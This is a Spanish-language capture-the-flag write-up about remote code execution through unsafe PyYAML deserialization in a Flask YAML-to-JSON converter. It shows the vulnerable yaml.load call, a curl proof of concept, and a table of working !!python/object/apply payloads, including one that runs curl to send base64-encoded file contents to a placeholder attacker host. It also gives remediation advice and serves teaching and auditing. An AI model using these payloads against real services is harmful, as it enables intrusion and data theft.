# 📄 YAML Ain't Safe

> Deserialización insegura en PyYAML → **RCE**

| Categoría | Dificultad | Puntos | Autor |
|---|---|---|---|
| Web | 🟢 Easy | 170 | diriartev |

**Flag:** `flag{daa2b8496590702a}`

---

## Resumen (TL;DR)

Un conversor online de YAML a JSON hecho en Flask y open-source. El endpoint `/convert` parsea el YAML del usuario con:

```python
parsed = yaml.load(yaml_input, Loader=yaml.Loader)  # ⚠️ Loader COMPLETO
```

Usa `yaml.Loader` completo en vez de `yaml.SafeLoader`. El Loader completo no solo convierte datos: **instancia objetos Python arbitrarios** a partir de tags como `!!python/object/apply:...`. Es deserialización insegura (**CWE-502**) → RCE.

Enviando un YAML con un tag que llama a `subprocess.check_output`, se ejecutan comandos en el servidor y se lee `/flag.txt`.

**Causa raíz:** `yaml.load()` con `Loader=yaml.Loader` sobre entrada del usuario. Debería ser `yaml.safe_load()`.

| | |
|---|---|
| **Instancia** | `63d8c97c5db0f0c1.chal.ctf.ae` |

## Paso 0 — Extraer el material

ZIP cifrado con AES, password `infected`:

```bash
7z x -y -pinfected "public(2).zip"   # -> app.py
```

## Paso 1 — Auditar el código fuente

Lo relevante de `app.py` es el endpoint `/convert`:

```python
@app.route("/convert", methods=["POST"])
def convert():
    data = request.get_json()
    if not data or "yaml_input" not in data:
        return jsonify({"error": "Missing yaml_input field"}), 400

    yaml_input = data["yaml_input"]
    if not yaml_input.strip():
        return jsonify({"error": "Empty YAML input"}), 400

    try:
        parsed = yaml.load(yaml_input, Loader=yaml.Loader)  # <-- VULNERABLE
        json_output = json.dumps(parsed, indent=2, default=str)
        return jsonify({"result": json_output})
    except yaml.YAMLError as e:
        return jsonify({"error": f"Invalid YAML: {e}"}), 400
    except Exception as e:
        return jsonify({"error": f"Conversion error: {e}"}), 500
```

Puntos clave:

- **Entrada del usuario:** campo `yaml_input` del JSON del POST.
- **Sink peligroso:** `yaml.load(..., Loader=yaml.Loader)`.
- El resultado se serializa con `json.dumps(parsed, default=str)`: si `parsed` no es serializable (como los `bytes` que devuelve `subprocess.check_output`), `default=str` lo convierte a texto → **la salida del comando aparece en la respuesta**.

### ¿Por qué es RCE?

El `yaml.Loader` completo de PyYAML soporta tags que construyen objetos Python:

```yaml
!!python/object/apply:<callable> [ <lista_de_argumentos> ]
```

Es equivalente a `pickle` pero en texto plano: se puede invocar cualquier función con cualquier argumento. `yaml.safe_load()` deshabilita estos tags; el Loader completo los ejecuta.

## Paso 2 — Comprobar el funcionamiento normal

```bash
B="https://63d8c97c5db0f0c1.chal.ctf.ae"
curl -s -X POST "$B/convert" -H "Content-Type: application/json" \
  -d '{"yaml_input":"name: test\nval: 1"}'
```

```json
{"result": "{\n  \"name\": \"test\",\n  \"val\": 1\n}"}
```

## Paso 3 — Explotación (RCE → leer la flag)

Payload YAML que ejecuta `cat /flag.txt`:

```yaml
!!python/object/apply:subprocess.check_output [["cat", "/flag.txt"]]
```

Enviado como JSON:

```bash
curl -s -X POST "$B/convert" -H "Content-Type: application/json" \
  --data-binary '{"yaml_input":"!!python/object/apply:subprocess.check_output [[\"cat\", \"/flag.txt\"]]"}'
```

Respuesta:

```json
{"result": "\"b'flag{daa2b8496590702a}\\n'\""}
```

`subprocess.check_output` devuelve `bytes`; `json.dumps(..., default=str)` los convierte en la cadena `b'flag{...}\n'`.

Variante equivalente con shell (útil para encadenar comandos):

```yaml
!!python/object/apply:subprocess.check_output [["sh", "-c", "cat /flag.txt"]]
```

🚩 **FLAG:** `flag{daa2b8496590702a}`

## PoC completo

```bash
#!/usr/bin/env bash
# YAML Ain't Safe — PyYAML deserialization RCE — autor: diriartev
B="https://63d8c97c5db0f0c1.chal.ctf.ae"
curl -s -X POST "$B/convert" -H "Content-Type: application/json" \
  --data-binary '{"yaml_input":"!!python/object/apply:subprocess.check_output [[\"cat\", \"/flag.txt\"]]"}'
# -> {"result":"\"b'flag{daa2b8496590702a}\\n'\""}
```

### Payloads alternativos

| Objetivo | Payload YAML |
|---|---|
| Leer archivo (con output) | `!!python/object/apply:subprocess.check_output [["cat","/flag.txt"]]` |
| Comando por shell | `!!python/object/apply:subprocess.check_output [["sh","-c","id; cat /flag.txt"]]` |
| `os.popen` | `!!python/object/apply:os.popen ["cat /flag.txt"]` (devuelve objeto; encadenar `.read`) |
| Ejecutar sin output | `!!python/object/apply:os.system ["cp /flag.txt /tmp/f"]` |
| Exfiltración ciega | `!!python/object/apply:os.system ["curl http://ATACANTE/$(cat /flag.txt\|base64)"]` |

## Remediación

- Usar `yaml.safe_load(data)` (o `Loader=yaml.SafeLoader`) para cualquier YAML que venga del usuario. Nunca `yaml.load` con `Loader`, `UnsafeLoader` o `FullLoader` sobre entrada no confiable.
- Validar/limitar el YAML a los tipos esperados (mapas, listas, escalares).
- Ejecutar el servicio con mínimos privilegios y en sandbox.

## Conclusión

`yaml.load()` sin *safe* sobre entrada del usuario = **RCE directo**. Es un bug de una sola línea que sigue apareciendo en producción porque el nombre obvio (`yaml.load`) es el peligroso y el seguro tiene el nombre incómodo (`safe_load`). Al auditar código: `grep -rn "yaml.load("`. Lo mismo aplica a Ruby (`YAML.load`) y Java (SnakeYAML con constructor por defecto).
